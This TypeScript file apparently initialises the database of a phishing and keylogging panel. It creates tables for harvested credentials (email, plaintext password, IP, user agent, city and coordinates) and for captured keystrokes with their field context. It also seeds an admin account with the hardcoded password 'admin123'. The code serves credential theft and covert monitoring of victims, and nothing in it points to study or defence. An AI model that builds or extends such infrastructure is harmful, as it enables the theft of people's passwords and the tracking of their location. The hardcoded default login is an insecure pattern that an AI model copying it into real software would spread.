import Database from 'better-sqlite3';
import path from 'path';
import fs from 'fs';

const DATA_DIR = path.join(process.cwd(), 'data');
const DB_PATH = path.join(DATA_DIR, 'database.sqlite');

let db: Database.Database;

export function getDb(): Database.Database {
  if (!db) {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    db = new Database(DB_PATH);
    db.pragma('journal_mode = WAL');
    initSchema();
  }
  return db;
}

function initSchema() {
  db.exec(`
    CREATE TABLE IF NOT EXISTS credentials (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL DEFAULT '',
      email TEXT NOT NULL,
      password TEXT NOT NULL DEFAULT '',
      ip TEXT NOT NULL DEFAULT '',
      user_agent TEXT,
      country TEXT DEFAULT '',
      city TEXT DEFAULT '',
      latitude REAL DEFAULT NULL,
      longitude REAL DEFAULT NULL,
      created_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS keylogs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      email_identifier TEXT DEFAULT '',
      key_data TEXT,
      field_context TEXT DEFAULT '',
      full_log TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS admin_users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT NOT NULL UNIQUE,
      password_hash TEXT NOT NULL,
      created_at TEXT DEFAULT (datetime('now'))
    );
  `);

  const count = db.prepare('SELECT COUNT(*) as c FROM admin_users').get() as { c: number };
  if (count.c === 0) {
    const bcrypt = require('bcryptjs');
    const hash = bcrypt.hashSync('admin123', 10);
    db.prepare('INSERT INTO admin_users (username, password_hash) VALUES (?, ?)').run('admin', hash);
  }
}

export function closeDb() {
  if (db) db.close();
}
